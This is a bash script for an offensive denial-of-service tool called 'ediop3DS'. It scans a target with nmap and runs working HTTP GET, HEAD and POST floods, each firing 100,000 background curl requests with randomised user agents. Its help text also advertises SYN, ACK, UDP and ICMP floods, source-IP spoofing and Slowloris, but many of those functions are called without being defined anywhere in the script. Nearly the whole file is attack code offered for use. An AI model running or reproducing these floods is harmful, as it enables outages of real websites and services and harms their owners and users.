    #!/bin/bash

# Color definitions
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

# Display logo function
display_logo() {
    echo -e "${CYAN}"
    echo -e """
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░░██████╗
██╔══██╗██╔════╝
██║░░██║╚█████╗░
██║░░██║░╚═══██╗
██████╔╝██████╔╝
╚═════╝░╚═════╝░
"""
    echo -e "${RESET}"
}

# Help function
show_help() {
    display_logo
    echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
    echo -e "${YELLOW}Options:${RESET}"
    echo -e "  -u    Target IP or URL (required)"
    echo -e "  -p    Target Port (default: 80)"
    echo -e "  -h    Show this help message"
    echo -e "  -s    Scan target for open ports before attacking"
    echo -e "  -r    Retry attack without port if no open ports are found"
    echo -e "  -i    Send ICMP ping flood (requires root)"
    echo -e "  -S    Send TCP SYN flood (requires root)"
    echo -e "  -A    Send TCP ACK flood (requires root)"
    echo -e "  -U    Send UDP flood (requires root)"
    echo -e "  -f    Specify a spoofed source IP address"
    echo -e "  -n    Set the number of requests to send (default: 1000)"
    echo -e "  -H    Send custom HTTP headers"
    echo -e "  -v    Enable verbose output"
    echo -e "  -pSize Specify packet size for attacks (default: 56)"
    echo -e "  -sFlag Specify TCP flag (SYN, ACK, etc.)"
    echo -e "  -seq   Specify sequence number for TCP packets"
    echo -e "  -win   Specify window size for TCP packets"
    echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
    echo -e "  -P     Specify packet delay (in ms)"
    echo -e "  -l     Perform Slowloris attack with automatic installation detection"
    echo -e "  -t     Target specific attack type (GET, POST, HEAD, SYN, etc.)"
}

# Scan for open ports and handle attacks
scan_ports() {
    target=$1
    echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
    open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
    if [ -z "$open_ports" ]; then
        echo -e "${RED}[!] No open ports found.${RESET}"
        return 1
    else
        echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
        port=$(echo "$open_ports" | head -n 1)
    fi
}

# Load user-agent list from a file
load_user_agents() {
    local file="user_agents.txt"
    local count=0
    user_agents=()
    while IFS= read -r line; do
        user_agents+=("$line")
        ((count++))
        if ((count >= 100000)); then
            break
        fi
    done < "$file"
}

# Function to get a random user-agent from the loaded list
get_random_user_agent() {
    echo "${user_agents[$RANDOM % ${#user_agents[@]}]}"
}

# Function to send HTTP GET flood
http_get_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP GET flood on $target with 100k user agents${RESET}"
    load_user_agents  # Load 100k user agents
    for ((i=0; i<100000; i++)); do
        user_agent=$(get_random_user_agent)  # Get a random user-agent
        curl -s -X GET $target -A "$user_agent" &>/dev/null &
    done
}

# Function to send HTTP HEAD flood
http_head_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP HEAD flood on $target with 100k user agents${RESET}"
    load_user_agents  # Load 100k user agents
    for ((i=0; i<100000; i++)); do
        user_agent=$(get_random_user_agent)  # Get a random user-agent
        curl -s -X HEAD $target -A "$user_agent" &>/dev/null &
    done
}

# Function to send HTTP POST flood
http_post_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP POST flood on $target with 100k user agents${RESET}"
    load_user_agents  # Load 100k user agents
    for ((i=0; i<100000; i++)); do
        user_agent=$(get_random_user_agent)  # Get a random user-agent
        curl -s -X POST $target --data "data=payload" -A "$user_agent" &>/dev/null &
    done
}

# Main function to handle user input
while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:" option; do
    case $option in
        u) target="$OPTARG";;
        p) port="$OPTARG";;
        s) scan_ports "$target";;
        i) http_icmp_flood "$target";;
        r) retry_attack "$target";;
        S) syn_flood "$target";;
        A) ack_flood "$target";;
        U) udp_flood "$target";;
        f) spoof_ip "$OPTARG";;
        n) num_requests="$OPTARG";;
        H) custom_headers "$OPTARG";;
        v) verbose=1;;
        l) slowloris_attack "$target";;
        t) attack_type="$OPTARG";;
        *) show_help;;
    esac
done
